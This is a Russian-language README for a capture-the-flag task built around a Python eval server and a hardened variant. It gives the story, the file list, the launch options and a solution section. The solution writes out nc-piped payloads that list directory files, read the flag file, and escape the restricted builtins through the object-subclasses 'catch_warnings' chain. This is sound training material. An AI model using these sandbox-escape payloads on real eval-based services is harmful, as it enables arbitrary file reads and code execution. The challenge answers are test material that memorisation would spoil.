Python eval
===========
**eval**
> Боб настолько любит Python, что не может прожить без него ни дня, но что делать если на новом рабочем компьютере Боба Python еще не установлен?  
> Боб написал небольшой скрипт, который принимает строку кода и исполняет ее, и запустил его у себя дома. Теперь Боб может в любое время писать код. Но, к сожалению, он не знал, что его код не безопасен. Говорят на его домашнем компьютере лежат секретные данные. Заполучите их!  

---

**eval hardned**
> К сожалению, кто-то взломал сервер, уже знакомого вам Боба, и секретные данные с его компьютера попали в сеть. Из-за этого он лишился работы и, как мы подозреваем, стал работать на тайную организацию, целью которой является - захват Мира.  
> Несмотря на то, что Боб улучшил защиту сервера, вам придется вновь взломать его, постарайтесь исправить то, что вы натворили в прошлый раз.  

Файлы
-----
1. **eval.py** - Псевдо исходный код, который доступен участникам
2. **eval2.py** - Псевдо исходный код для "harder", который доступен участникам
3. **159fe327e79316e0f9169fa326fafbd1.txt** - Файл с флагом
4. **blacklist.txt** - Файл с запрещенными словами
5. **server.py** - Исходный код
6. **server2.py** - Исходный код "harder" версии

Запуск
------
```
python3 server.py [-h] [-host HOST] [-p PORT] [-cpu CPU] [-t TIMEOUT]
```
host - Имя хоста, по умолчанию - socket.gethostname()  
port - Порт, по умолчанию 1337  
cpu - Количество одновременно запущенных процессов, по умолчанию 16  
timeout - Время жизни одного процесса, по умолчанию 3 секунды  

---

[Описание проблемы](https://habrahabr.ru/post/221937/)  
Единственное отличие "harder" версии от обычной в том, что теперь закрыт доступ не только к глобальным переменным, но и к \__builtins__

---

Решение
-------
1. Получить список файлов в папке  
    ```
    echo "__import__('os').listdir()" | nc адрес порт
    ```
2. Прочесть флаг  
    ```
    echo "open('имя файла с флагом').read()" | nc адрес порт
    ```  

Решение "harder" версии
------------------
1. Получить доступ к встроенным \__builtins__  
    ```
    [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__
    ```
2. Получить список файлов в папке  
    ```
    echo "[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').listdir()" | nc адрес порт
    ```
3. Прочесть флаг  
    ```
    echo "[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['open']('имя файла с флагом').read()" | nc адрес порт
    ```

[Источник](https://www.reddit.com/r/Python/comments/hftnp/ask_rpython_recovering_cleared_globals#thing_t1_c1v372r)